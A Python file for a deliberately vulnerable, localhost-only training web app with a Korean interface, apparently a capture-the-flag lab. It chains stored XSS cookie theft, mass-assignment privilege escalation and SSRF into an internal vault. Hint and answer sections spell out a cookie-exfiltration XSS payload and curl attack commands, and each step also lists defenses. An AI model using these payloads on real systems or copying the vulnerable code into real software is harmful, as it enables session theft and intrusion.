#!/usr/bin/env python3
"""
8단계 취약 웹앱 — 연쇄 익스플로잇 / 킬체인 (최상급, 교육용, localhost 전용).

앞의 단계들이 '서로 무관한 개별 취약점 5개'였다면, 이 단계는
'하나의 애플리케이션'을 대상으로 취약점 4개를 순서대로 엮어(chain)
최종 장악에 도달하는 실전형 시나리오입니다. 각 단계는 앞 단계에서 얻은
'전리품(토큰·권한·키)'이 있어야만 다음 단계가 열립니다 — 한 고리라도
끊기면 체인 전체가 멈춥니다.

시나리오: 사내 인프라 관리 콘솔 "InfraDesk". 당신은 권한 없는 외부인입니다.
  1) 게시판 저장형 XSS 로 '관리자 봇'의 세션 쿠키(admin 토큰)를 탈취
  2) 탈취한 admin 토큰으로 관리자 영역 진입 → mass-assignment 로 superadmin 권한 상승
  3) superadmin 전용 'URL 미리보기' 기능의 SSRF 로 내부 전용 서비스 도달
  4) 내부 서비스의 Vault 에서 최종 비밀 탈취 → 완전 장악

경고: 고의로 취약. 127.0.0.1 에서 학습용으로만.
의존성 없음 (Python 표준 라이브러리만). 실행: python vuln_app.py → http://127.0.0.1:8007
"""

import html
import os
import secrets
import sqlite3
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "vuln8.db")
HOST, PORT = "127.0.0.1", 8007

# --------------------------------------------------------------------------
# 런타임 상태 (init_db 에서 초기화). 실전이라면 서버 메모리/세션스토어에 해당.
# --------------------------------------------------------------------------
SESSIONS = {}          # session_token -> username  (유효한 세션들)
ADMIN_TOKEN = ""       # '관리자 봇'이 브라우저에 들고 다니는 세션 쿠키 (탈취 대상)
INTERNAL_SECRET = ""   # 내부 서비스가 신뢰하는 게이트웨이 헤더 값 (서버만 앎)
VAULT_KEY = ""         # 내부 index 가 노출하는 vault 접근 키 (3단계→4단계 연결고리)
COLLECTOR = []         # 공격자가 통제하는 수집 서버(시뮬)에 쌓인 데이터

# 진행 상황 — 각 체크포인트 달성 여부. 실제 상태 변화가 있을 때만 True 로 켠다.
PROGRESS = {"chain1": False, "chain2": False, "chain3": False, "chain4": False}

# users 테이블 컬럼 목록 — mass-assignment 취약점이 '무엇이든' 덮어쓸 수 있는 후보.
USER_COLUMNS = {"username", "password", "role", "display_name"}


# --------------------------------------------------------------------------
# DB & 상태 준비
# --------------------------------------------------------------------------
def init_db():
    global ADMIN_TOKEN, INTERNAL_SECRET, VAULT_KEY, SESSIONS, COLLECTOR, PROGRESS
    if os.path.exists(DB_PATH):
        os.remove(DB_PATH)
    con = sqlite3.connect(DB_PATH)
    cur = con.cursor()
    cur.execute(
        "CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, "
        "role TEXT, display_name TEXT)"
    )
    cur.executemany(
        "INSERT INTO users (username, password, role, display_name) VALUES (?,?,?,?)",
        [
            # admin = '관리자 봇'. 권한은 moderator 급(admin)일 뿐 최고권한은 아니다.
            ("admin", "N0t_Th3_Real_Secret!", "admin", "관리자"),
            ("carol", "hunter2", "staff", "캐롤(직원)"),
        ],
    )
    # 게시판 댓글 (저장형 XSS 표적). 초기 데이터 1개.
    cur.execute("CREATE TABLE comments (id INTEGER PRIMARY KEY, author TEXT, body TEXT)")
    cur.execute(
        "INSERT INTO comments (author, body) VALUES (?,?)",
        ("carol", "신규 인프라 콘솔 오픈했습니다. 문의는 댓글로!"),
    )
    con.commit()
    con.close()

    # 세션/비밀 초기화. admin 토큰은 예측 불가하지만, XSS 로 '봇'에게서 탈취된다.
    SESSIONS = {}
    COLLECTOR = []
    PROGRESS = {"chain1": False, "chain2": False, "chain3": False, "chain4": False}
    ADMIN_TOKEN = "sess_" + secrets.token_hex(16)
    SESSIONS[ADMIN_TOKEN] = "admin"
    INTERNAL_SECRET = "gw_" + secrets.token_hex(16)   # 내부 게이트웨이 신뢰 헤더
    VAULT_KEY = "vault_" + secrets.token_hex(8)       # vault 접근 키


def db():
    return sqlite3.connect(DB_PATH)


def user_role(username):
    con = db()
    row = con.execute("SELECT role FROM users WHERE username=?", (username,)).fetchone()
    con.close()
    return row[0] if row else None


# --------------------------------------------------------------------------
# HTML 레이아웃 (hack1/hack2 와 동일 계열, 최상급 테마)
# --------------------------------------------------------------------------
CSS = """
<style>
  body{font-family:system-ui,Segoe UI,Arial,sans-serif;max-width:960px;margin:0 auto;
       padding:1rem;background:#0a0e17;color:#e6e6e6;line-height:1.55}
  a{color:#6cb6ff} h1,h2,h3{color:#fff}
  nav{display:flex;gap:.55rem;flex-wrap:wrap;padding:.75rem 0;border-bottom:1px solid #333;margin-bottom:1rem}
  nav a{padding:.3rem .6rem;background:#141b2b;border-radius:6px;text-decoration:none}
  .card{background:#111827;border:1px solid #26303f;border-radius:10px;padding:1rem;margin:1rem 0}
  .hint{background:#1a1206;border-left:3px solid #d0a83a;padding:.6rem .9rem;margin:.6rem 0;border-radius:4px}
  .flag{color:#7ee787;font-weight:bold}
  input,textarea{background:#0a0e17;color:#e6e6e6;border:1px solid #3a4756;border-radius:6px;
                 padding:.45rem;font-size:1rem;width:100%;max-width:520px;box-sizing:border-box}
  button{background:#7c3aed;color:#fff;border:0;border-radius:6px;padding:.5rem 1rem;
         font-size:1rem;cursor:pointer;margin-top:.5rem}
  code,pre{background:#060a12;padding:.15rem .35rem;border-radius:4px;color:#c9a6ff}
  pre{padding:.8rem;overflow:auto;display:block}
  .warn{background:#3a1414;border:1px solid #7a2222;padding:.6rem;border-radius:8px;color:#ffb4b4}
  details summary{cursor:pointer;color:#d0a83a}
  label{display:block;margin:.5rem 0 .2rem}
  .lvl{font-size:.8rem;background:#3a1a1a;color:#ff9a9a;padding:.1rem .5rem;border-radius:10px}
  .prog{display:flex;gap:.5rem;flex-wrap:wrap;margin:.5rem 0}
  .step{flex:1;min-width:150px;background:#0d1420;border:1px solid #26303f;border-radius:8px;padding:.5rem .7rem;font-size:.9rem}
  .step.done{border-color:#2ea043;background:#0c1f13}
  .step .n{font-size:.75rem;color:#8b98a5}
  .chip{display:inline-block;font-size:.75rem;padding:.05rem .45rem;border-radius:10px;background:#26303f;color:#c9d1d9}
  .chip.ok{background:#238636;color:#fff}
  .lock{color:#ff9a9a}
</style>
"""

NAV = """
<nav>
  <a href="/">🏠 브리핑</a>
  <a href="/board">1. 게시판(XSS)</a>
  <a href="/collect">🛰️ 수집 서버</a>
  <a href="/admin">2. 관리자 콘솔</a>
  <a href="/admin/urlpreview">3. URL 미리보기(SSRF)</a>
</nav>
"""


def progress_panel():
    steps = [
        ("1", "XSS → 토큰 탈취", "chain1"),
        ("2", "토큰 → 권한 상승", "chain2"),
        ("3", "SSRF → 내부 도달", "chain3"),
        ("4", "Vault → 완전 장악", "chain4"),
    ]
    cells = ""
    for n, label, key in steps:
        done = PROGRESS[key]
        chip = '<span class="chip ok">달성</span>' if done else '<span class="chip lock">🔒 잠김</span>'
        cells += f'<div class="step {"done" if done else ""}"><div class="n">STEP {n}</div>{label}<br>{chip}</div>'
    return f'<div class="prog">{cells}</div>'


def page(title, body):
    return f"""<!doctype html><html lang="ko"><head><meta charset="utf-8">
<title>{title}</title>{CSS}</head><body>{NAV}{progress_panel()}{body}</body></html>""".encode("utf-8")


# --------------------------------------------------------------------------
# 홈 / 브리핑
# --------------------------------------------------------------------------
def view_home():
    body = """
    <h1>🧨 8단계 — 연쇄 익스플로잇(킬체인) <span class="lvl">최상</span></h1>
    <div class="warn">고의로 취약. 127.0.0.1 학습 전용. 외부 노출 절대 금지.</div>
    <p>당신은 사내 인프라 콘솔 <b>InfraDesk</b> 에 접근한 <b>권한 없는 외부인</b>입니다.
    단독 취약점 하나로는 아무것도 못 합니다. <b>네 개의 약점을 순서대로 엮어야</b>
    최종 목표(내부 Vault 장악)에 도달합니다.</p>

    <div class="card">
      <h2>🎯 킬체인 개요 — 각 단계는 앞 단계의 전리품으로만 열린다</h2>
      <ol>
        <li><b>저장형 XSS → 세션 탈취</b> :
            게시판 댓글에 쿠키 탈취 스크립트를 심으면, 서버의 <b>관리자 봇</b>이 그 글을 열람하며
            자기 세션 쿠키(admin 토큰)를 당신의 수집 서버로 흘립니다.
            → 체크포인트 <span class="flag">FLAG{chain1_xss_token_stolen}</span></li>
        <li><b>탈취 토큰 → 권한 상승</b> :
            훔친 admin 토큰으로 관리자 콘솔에 들어가고, 프로필 저장 기능의
            <b>mass-assignment</b> 결함으로 스스로를 <code>superadmin</code> 으로 올립니다.
            → <span class="flag">FLAG{chain2_privilege_escalated}</span></li>
        <li><b>관리자 기능의 SSRF → 내부 도달</b> :
            superadmin 만 쓰는 'URL 미리보기'로, 외부에선 못 여는
            <b>내부 전용 서비스</b>를 서버 대신 호출합니다.
            → <span class="flag">FLAG{chain3_internal_reached}</span></li>
        <li><b>내부 Vault → 완전 장악</b> :
            내부 서비스가 흘린 vault 키로 최종 비밀 저장소를 열어 장악합니다.
            → <span class="flag">FLAG{full_killchain_pwned}</span></li>
      </ol>
    </div>

    <div class="card">
      <h2>진행 규칙</h2>
      <ul>
        <li>각 단계는 <b>정말로</b> 앞 단계 산출물이 있어야 통과됩니다 — 건너뛰기는 서버가 막습니다.</li>
        <li>막히면 각 페이지의 <b>🎯 목표 · 💡 힌트 · 정답 펼치기</b>를 참고하세요.</li>
        <li>위쪽 진행 표시줄에서 어디까지 왔는지 확인하세요.</li>
      </ul>
    </div>
    """
    return page("킬체인 브리핑", body)


# --------------------------------------------------------------------------
# STEP 1 — 게시판 저장형 XSS + '관리자 봇' 시뮬레이션
# --------------------------------------------------------------------------
def _admin_bot_visit(latest_body):
    """관리자 봇이 게시판을 열람하는 것을 서버측에서 시뮬레이션한다.

    실제라면: admin 브라우저가 페이지를 열고, 저장된 XSS 가 실행되어
    document.cookie 를 공격자 수집 서버로 전송한다. 여기선 실제 피해자
    브라우저가 없으므로, 서버가 그 결과(=admin 쿠키가 /collect 로 새는 것)를
    대신 수행한다. 단, '쿠키를 훔쳐 /collect 로 보내는 형태의 페이로드'일 때만
    실행되도록 해서 실제 공격 페이로드의 모양을 학습하게 한다.
    """
    b = latest_body.lower()
    looks_like_cookie_exfil = ("document.cookie" in b) and ("collect" in b)
    if not looks_like_cookie_exfil:
        return False
    # 봇의 브라우저가 onerror/onload 스크립트를 '실행'한 것과 동일한 효과:
    # 자신의 세션 쿠키를 수집 엔드포인트로 전송한다.
    _collect_store(f"session={ADMIN_TOKEN}")
    return True


def view_board(method, body_params):
    notice = ""
    if method == "POST":
        author = html.escape(body_params.get("author", ["익명"])[0] or "익명")
        text = body_params.get("body", [""])[0]
        if text:
            con = db()
            con.execute("INSERT INTO comments (author, body) VALUES (?,?)", (author, text))
            con.commit()
            con.close()
            # 새 댓글이 올라오면 '관리자 봇'이 확인차 게시판을 방문한다(시뮬).
            if _admin_bot_visit(text):
                notice = ('<div class="card">🤖 <b>관리자 봇</b>이 방금 이 글을 열람했습니다. '
                          '봇의 브라우저에서 스크립트가 실행된 것 같습니다… '
                          '<a href="/collect">🛰️ 수집 서버</a>를 확인해 보세요.</div>')
            else:
                notice = ('<div class="card">🤖 관리자 봇이 글을 열람했지만, 별다른 일은 일어나지 않았습니다. '
                          '(봇의 쿠키를 실제로 빼내는 형태의 페이로드였나요?)</div>')

    con = db()
    rows = con.execute("SELECT author, body FROM comments ORDER BY id").fetchall()
    con.close()
    # 취약: 저장된 댓글 본문을 이스케이프 없이 렌더 → 저장형 XSS.
    items = "".join(
        f"<div class='card'><b>{a}</b><br>{b}</div>" for a, b in rows
    )
    body = f"""
    <h1>STEP 1 · 사내 게시판 — 저장형 XSS 로 관리자 봇 세션 탈취</h1>
    <div class="card">
      <form method="post">
        <label>이름</label><input name="author" placeholder="attacker">
        <label>댓글</label><textarea name="body" rows="3" placeholder="여기에 페이로드"></textarea>
        <button>등록</button>
      </form>
      {notice}
    </div>
    <h2>댓글 목록</h2>
    {items}
    <p><b>🎯 목표:</b> 댓글에 <b>쿠키 탈취 스크립트</b>를 심으세요. 새 댓글이 등록되면 서버의
    <b>관리자 봇</b>이 게시판을 열람하고, 봇의 브라우저에서 스크립트가 실행되어
    봇의 세션 쿠키(admin 토큰)가 당신의 <a href="/collect">수집 서버(/collect)</a>로 전송됩니다.</p>
    <div class="hint">💡 힌트 1: 이 페이지는 댓글 본문을 이스케이프 없이 그대로 출력합니다.
      <code>&lt;img&gt;</code> 의 <code>onerror</code> 이벤트로 스크립트를 실행할 수 있습니다.</div>
    <div class="hint">💡 힌트 2: 탈취한 쿠키를 어딘가로 <b>보내야</b> 합니다. 이 앱에는 공격자용
      수집 엔드포인트 <code>/collect?c=...</code> 가 있습니다. <code>document.cookie</code> 를 거기로 실어 보내세요.</div>
    <details><summary>정답 보기</summary>
      <p>댓글 칸에:</p>
      <pre>&lt;img src=x onerror="new Image().src='/collect?c='+document.cookie"&gt;</pre>
      <p>등록하면 관리자 봇이 열람하며 이 스크립트를 실행 → 봇의
      <code>session=...</code> 쿠키가 <a href="/collect">/collect</a> 로 넘어옵니다.
      거기서 <span class="flag">FLAG{{chain1_xss_token_stolen}}</span> 와 admin 토큰을 확인하세요.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> 출력 시 HTML 이스케이프 + <code>Content-Security-Policy</code> 로
      인라인 스크립트 차단. 세션 쿠키에 <code>HttpOnly</code> 를 걸면 <code>document.cookie</code> 로
      읽지 못해 <b>이 한 고리가 끊기고 체인 전체가 무너집니다.</b></div>
    """
    return page("STEP 1 · 저장형 XSS", body)


# --------------------------------------------------------------------------
# 공격자 수집 서버(시뮬) — /collect
# --------------------------------------------------------------------------
def _collect_store(value):
    COLLECTOR.append(value)
    # admin 토큰이 실제로 수집됐다면 STEP 1 달성.
    if f"session={ADMIN_TOKEN}" in value:
        PROGRESS["chain1"] = True


def view_collect(params):
    # 취약점이 아니라 '공격자 인프라'. XSS 페이로드가 쿠키를 실어 보내는 목적지.
    c = params.get("c", [None])[0]
    if c is not None:
        _collect_store(c)
        # 픽셀 응답처럼 짧게 응답 (브라우저 new Image().src 대응)
        return page("collect", "<h1>수집됨</h1><p>1건 저장했습니다.</p>")

    if COLLECTOR:
        log = "\n".join(html.escape(x) for x in COLLECTOR)
        collected = f"<pre>{log}</pre>"
    else:
        collected = "<p>아직 수집된 데이터가 없습니다. STEP 1 에서 XSS 페이로드를 심어보세요.</p>"

    flag = ""
    if PROGRESS["chain1"]:
        # 수집된 admin 토큰을 그대로 보여준다(다음 단계의 재료).
        flag = (
            f'<div class="card"><p class="flag">🎉 FLAG{{chain1_xss_token_stolen}} — '
            f'관리자 봇의 세션을 탈취했습니다!</p>'
            f'<p>탈취한 admin 세션 토큰:</p><pre>{html.escape(ADMIN_TOKEN)}</pre>'
            f'<p>이제 이 토큰을 <code>session</code> 쿠키로 들고 '
            f'<a href="/admin">STEP 2 · 관리자 콘솔</a>로 가세요.</p></div>'
        )
    body = f"""
    <h1>🛰️ 공격자 수집 서버 <span class="lvl">/collect</span></h1>
    <p>XSS 페이로드가 훔친 데이터를 실어 보내는 <b>공격자 통제</b> 엔드포인트입니다.
    (실전에선 당신 소유의 외부 서버; 여기선 로컬 시뮬레이션입니다.)</p>
    <div class="card"><h2>수집 로그</h2>{collected}</div>
    {flag}
    """
    return page("수집 서버", body)


# --------------------------------------------------------------------------
# STEP 2 — 탈취 토큰으로 관리자 콘솔 진입 + mass-assignment 권한 상승
# --------------------------------------------------------------------------
def view_admin(identity):
    """identity = (username, role) or None. 세션 토큰으로 인증된 신원."""
    if not identity:
        body = """
        <h1>STEP 2 · 관리자 콘솔</h1>
        <div class="warn">🔒 인증이 필요합니다. 유효한 <code>session</code> 쿠키가 없습니다.</div>
        <p><b>🎯 목표:</b> STEP 1 에서 <b>탈취한 admin 세션 토큰</b>을 <code>session</code> 쿠키로 제시해
        이 콘솔에 들어오세요. (토큰 없이는 진입 불가 — STEP 1 이 반드시 선행되어야 합니다.)</p>
        <div class="hint">💡 힌트: 브라우저라면 개발자도구 콘솔에서
          <code>document.cookie='session=탈취한토큰'</code> 후 새로고침.
          curl 이라면 <code>-b "session=탈취한토큰"</code>.</div>
        <details><summary>정답 보기</summary>
          <pre>curl -b "session=&lt;/collect 에서 얻은 토큰&gt;" http://127.0.0.1:8007/admin</pre>
        </details>
        """
        return page("STEP 2 · 관리자 콘솔", body)

    username, role = identity
    con = db()
    row = con.execute(
        "SELECT username, role, display_name FROM users WHERE username=?", (username,)
    ).fetchone()
    con.close()
    uname, urole, dname = row

    flag = ""
    if urole == "superadmin":
        PROGRESS["chain2"] = True
        flag = (
            '<div class="card"><p class="flag">🎉 FLAG{chain2_privilege_escalated} — '
            'mass-assignment 로 superadmin 권한을 획득했습니다!</p>'
            '<p>이제 superadmin 전용 <a href="/admin/urlpreview">STEP 3 · URL 미리보기</a>가 열렸습니다.</p></div>'
        )

    body = f"""
    <h1>STEP 2 · 관리자 콘솔 — 권한 상승(mass-assignment)</h1>
    <div class="card">
      <p>인증된 신원: <b>{html.escape(uname)}</b> · 현재 권한: <b>{html.escape(urole)}</b> ·
      표시 이름: {html.escape(dname)}</p>
    </div>
    <div class="card">
      <h2>내 프로필 수정</h2>
      <form method="post" action="/admin/profile">
        <label>표시 이름 (display_name)</label>
        <input name="display_name" value="{html.escape(dname)}">
        <button>저장</button>
      </form>
    </div>
    {flag}
    <p><b>🎯 목표:</b> 당신의 토큰은 <code>admin</code>(중간 관리자)일 뿐, SSRF 도구는
    <code>superadmin</code> 만 씁니다. 프로필 저장 기능을 악용해 스스로를 <code>superadmin</code> 으로 올리세요.</p>
    <div class="hint">💡 힌트 1: 폼은 <code>display_name</code> 하나만 보내지만, 서버는 <b>받은 필드를
      그대로 사용자 레코드에 덮어씁니다</b>(mass-assignment). 폼에 없는 필드를 추가로 보내면?</div>
    <div class="hint">💡 힌트 2: 사용자 레코드에는 <code>role</code> 컬럼이 있습니다.
      POST 본문에 <code>role=superadmin</code> 을 끼워 넣어 보세요.</div>
    <details><summary>정답 보기</summary>
      <pre>curl -b "session=&lt;admin 토큰&gt;" \\
     --data "display_name=pwned&role=superadmin" \\
     http://127.0.0.1:8007/admin/profile</pre>
      <p>저장 후 <code>/admin</code> 을 다시 열면 권한이 <code>superadmin</code> 이 되고
      <span class="flag">FLAG{{chain2_privilege_escalated}}</span> 가 나타납니다.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> 클라이언트가 보낸 필드를 통째로 신뢰하지 말고,
      수정 가능한 필드를 <b>화이트리스트</b>(<code>display_name</code> 만)로 제한하세요.
      <code>role</code> 같은 권한 필드는 서버 로직으로만 변경돼야 합니다.</div>
    """
    return page("STEP 2 · 권한 상승", body)


def view_admin_profile(identity, body_params):
    if not identity:
        return page("STEP 2", '<div class="warn">🔒 인증 필요.</div>'), 403
    username, _ = identity
    # 취약: 받은 파라미터를 컬럼 화이트리스트 없이(=존재하는 컬럼이면 무엇이든) 덮어쓴다.
    updates = {}
    for k, vals in body_params.items():
        if k in USER_COLUMNS and vals:
            updates[k] = vals[0]
    if updates:
        sets = ", ".join(f"{k}=?" for k in updates)
        args = list(updates.values()) + [username]
        con = db()
        con.execute(f"UPDATE users SET {sets} WHERE username=?", args)
        con.commit()
        con.close()
    # 저장 후 콘솔로 리다이렉트 대신 즉시 재렌더(신원은 username 기준으로 최신 role 재조회됨).
    new_role = user_role(username)
    return view_admin((username, new_role)), 200


# --------------------------------------------------------------------------
# STEP 3 — superadmin 전용 URL 미리보기(SSRF) → 내부 서비스 도달
# --------------------------------------------------------------------------
def view_urlpreview(identity, method, body_params):
    if not identity:
        return page("STEP 3", '<div class="warn">🔒 인증 필요 (STEP 1·2 선행).</div>'), 403
    username, role = identity
    role = user_role(username)  # 최신 권한 재확인
    if role != "superadmin":
        body = f"""
        <h1>STEP 3 · URL 미리보기 (SSRF)</h1>
        <div class="warn">🔒 이 기능은 <b>superadmin</b> 전용입니다. 현재 권한: <b>{html.escape(role)}</b>.</div>
        <p><b>🎯 목표:</b> STEP 2 에서 권한을 <code>superadmin</code> 으로 올린 뒤 다시 오세요.
        (권한 없이는 SSRF 도구 자체가 안 열립니다 — STEP 2 가 반드시 선행되어야 합니다.)</p>
        """
        return page("STEP 3 · SSRF", body), 403

    out = ""
    if method == "POST":
        url = body_params.get("url", [""])[0]
        # 취약: 목적지 검증 없이 서버가 대신 요청. 게다가 '내부 서비스는 게이트웨이가
        # 붙여주는 신뢰 헤더를 보고 통과시킨다'는 전제로, 미리보기 요청에 그 헤더를
        # 자동으로 실어 보낸다 → SSRF 로 내부 신뢰 경계를 그대로 넘게 된다.
        try:
            req = urllib.request.Request(
                url,
                headers={"User-Agent": "InfraDesk-preview",
                         "X-Internal-Auth": INTERNAL_SECRET},
            )
            with urllib.request.urlopen(req, timeout=5) as r:
                data = r.read(4000).decode("utf-8", "replace")
            out = f"<p>가져온 URL: <code>{html.escape(url)}</code></p><pre>{html.escape(data)}</pre>"
        except Exception as e:
            out = f'<div class="warn">{html.escape(str(e))}</div>'

    body = f"""
    <h1>STEP 3 · URL 미리보기 (SSRF) — superadmin 전용</h1>
    <p>서버가 대신 지정한 URL 을 요청해 내용을 보여줍니다.</p>
    <div class="card">
      <form method="post">
        <label>미리볼 URL</label>
        <input name="url" placeholder="http://example.com" style="max-width:100%">
        <button>가져오기</button>
      </form>
      {out}
    </div>
    <p><b>🎯 목표:</b> 이 서버에만 존재하는 <b>내부 전용 서비스</b>
    <code>http://127.0.0.1:{PORT}/internal/</code> 를 SSRF 로 호출하세요.
    이 경로는 외부에서 직접 열면 차단되지만(내부 신뢰 헤더가 없으니까),
    이 미리보기 기능을 거치면 서버가 그 헤더를 <b>자동으로 붙여</b> 통과시킵니다.</p>
    <div class="hint">💡 힌트: URL 칸에 외부 주소 대신 <code>http://127.0.0.1:{PORT}/internal/</code>
      같은 내부 주소를 넣으면, 서버의 위치·신뢰 수준으로 요청이 나갑니다.</div>
    <details><summary>정답 보기</summary>
      <pre>curl -b "session=&lt;admin 토큰&gt;" \\
     --data "url=http://127.0.0.1:{PORT}/internal/" \\
     http://127.0.0.1:{PORT}/admin/urlpreview</pre>
      <p>응답에 <span class="flag">FLAG{{chain3_internal_reached}}</span> 와
      <b>vault 접근 키</b>가 담겨 옵니다. 그 키가 STEP 4 의 재료입니다.</p>
    </details>
    <div class="card"><b>🛡️ 방어:</b> 목적지를 화이트리스트로 제한하고 사설/루프백 IP 를 차단.
      무엇보다 <b>내부 서비스가 '헤더 하나'로 신뢰를 판단하지 말 것</b> — SSRF 가 바로 그 신뢰를
      빌려 씁니다. 미리보기 요청에 내부 인증 헤더를 자동 첨부하는 설계는 그 자체가 결함입니다.</div>
    """
    return page("STEP 3 · SSRF", body), 200


# --------------------------------------------------------------------------
# STEP 3 표적 / STEP 4 — 내부 전용 서비스 (SSRF 로만 도달 가능)
# --------------------------------------------------------------------------
def view_internal(path, params, internal_auth):
    """내부 서비스. 게이트웨이 신뢰 헤더(X-Internal-Auth)가 맞아야만 응답한다.

    직접 curl 로 열면 헤더가 없어 403 → 반드시 STEP 3 의 SSRF(미리보기)를 거쳐야 한다.
    """
    if internal_auth != INTERNAL_SECRET:
        return page("forbidden",
                    "<h1>403 Forbidden</h1><p>내부 게이트웨이를 통하지 않은 요청입니다. "
                    "이 서비스는 내부 신뢰 헤더가 있는 요청만 처리합니다.</p>"), 403

    if path == "/internal/" or path == "/internal":
        # STEP 3 달성: 내부 index 도달 + vault 키 노출(= STEP 4 재료).
        PROGRESS["chain3"] = True
        body = f"""<h1>🏢 InfraDesk 내부 서비스 (INTERNAL ONLY)</h1>
        <p class="flag">FLAG{{chain3_internal_reached}}</p>
        <p>내부 신뢰 경계 안에 도달했습니다. 사용 가능한 내부 엔드포인트:</p>
        <ul>
          <li><code>/internal/vault?key=...</code> — 비밀 저장소(Vault). 접근 키 필요.</li>
        </ul>
        <p><b>Vault 접근 키:</b> <code>{html.escape(VAULT_KEY)}</code></p>
        <p>같은 SSRF 로 <code>/internal/vault?key={html.escape(VAULT_KEY)}</code> 를 호출하면 최종 장악.</p>"""
        return page("internal", body), 200

    if path == "/internal/vault":
        key = params.get("key", [""])[0]
        if key != VAULT_KEY:
            return page("vault",
                        "<h1>🔒 Vault</h1><p>접근 키가 올바르지 않습니다. "
                        "먼저 <code>/internal/</code> 에서 vault 키를 확보하세요.</p>"), 403
        # STEP 4 달성: 최종 장악.
        PROGRESS["chain4"] = True
        body = """<h1>🗝️ Vault — 최종 비밀 저장소</h1>
        <p class="flag">FLAG{full_killchain_pwned}</p>
        <p>킬체인 완성: XSS 로 세션을 훔치고 → 권한을 올리고 → SSRF 로 내부에 침투해 →
        Vault 를 장악했습니다. 실전이라면 여기서 자격증명·키·인프라 제어권을 얻습니다.</p>
        <div class="card"><b>🛡️ 방어 요약 — 한 고리만 끊어도 전부 막힌다:</b>
        <ul>
          <li>STEP1: 출력 이스케이프 + CSP + 쿠키 <code>HttpOnly</code> → 쿠키 탈취 불가</li>
          <li>STEP2: 수정 필드 화이트리스트 → <code>role</code> 자가상승 불가</li>
          <li>STEP3: SSRF 목적지 검증 + 내부 신뢰를 헤더로 판단하지 않기 → 내부 도달 불가</li>
          <li>STEP4: Vault 접근에 강한 인증·감사 → 키 노출만으론 부족</li>
        </ul></div>"""
        return page("vault", body), 200

    return page("404", "<h1>404</h1><p>내부 경로 없음.</p>"), 404


# --------------------------------------------------------------------------
# HTTP 핸들러
# --------------------------------------------------------------------------
class Handler(BaseHTTPRequestHandler):
    def _send(self, content, status=200):
        self.send_response(status)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(content)))
        self.end_headers()
        self.wfile.write(content)

    def _session_token(self, params):
        # 세션 토큰: 쿠키 session=, 쿼리 ?session=, 헤더 X-Session 순으로 허용.
        raw = self.headers.get("Cookie", "")
        for part in raw.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                if k == "session":
                    return v
        if params.get("session"):
            return params["session"][0]
        return self.headers.get("X-Session")

    def _identity(self, params):
        token = self._session_token(params)
        if token and token in SESSIONS:
            uname = SESSIONS[token]
            return (uname, user_role(uname))
        return None

    def _route(self, method):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        params = urllib.parse.parse_qs(parsed.query)
        body_params = {}
        if method == "POST":
            length = int(self.headers.get("Content-Length", 0))
            raw = self.rfile.read(length).decode("utf-8", "replace") if length else ""
            body_params = urllib.parse.parse_qs(raw)

        identity = self._identity(params)

        if path == "/":
            self._send(view_home())
        elif path == "/board":
            self._send(view_board(method, body_params))
        elif path == "/collect":
            self._send(view_collect(params))
        elif path == "/admin":
            self._send(view_admin(identity))
        elif path == "/admin/profile":
            content, status = view_admin_profile(identity, body_params)
            self._send(content, status=status)
        elif path == "/admin/urlpreview":
            content, status = view_urlpreview(identity, method, body_params)
            self._send(content, status=status)
        elif path.startswith("/internal"):
            content, status = view_internal(path, params, self.headers.get("X-Internal-Auth"))
            self._send(content, status=status)
        else:
            self._send(page("404", "<h1>404 Not Found</h1>"), status=404)

    def do_GET(self):
        self._route("GET")

    def do_POST(self):
        self._route("POST")

    def log_message(self, fmt, *args):
        print("[req]", self.address_string(), fmt % args)


def main():
    init_db()
    server = ThreadingHTTPServer((HOST, PORT), Handler)
    print(f"8단계 킬체인 취약 웹앱 실행 중 → http://{HOST}:{PORT}  (Ctrl+C 로 종료)")
    print("경고: localhost 전용. 외부에 노출하지 마세요.")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n종료합니다.")
        server.shutdown()


if __name__ == "__main__":
    main()
